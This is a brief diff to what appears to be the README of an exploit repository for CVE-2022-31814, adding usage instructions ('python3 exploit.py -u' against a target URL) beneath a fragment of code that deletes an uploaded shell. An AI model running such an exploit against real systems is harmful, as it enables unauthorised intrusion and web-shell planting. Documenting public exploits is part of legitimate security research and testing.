@@ -56,3 +56,9 @@ try:
 except:
 	delete_shell(url, shell_filename)
 ```
+<br>
+# use exploit :
+***
+python3 exploit.py -u http://target.com/index.php?url=ref
+***
+<img src="https://github.com/drcayber/CVE-2022-31814/temp">
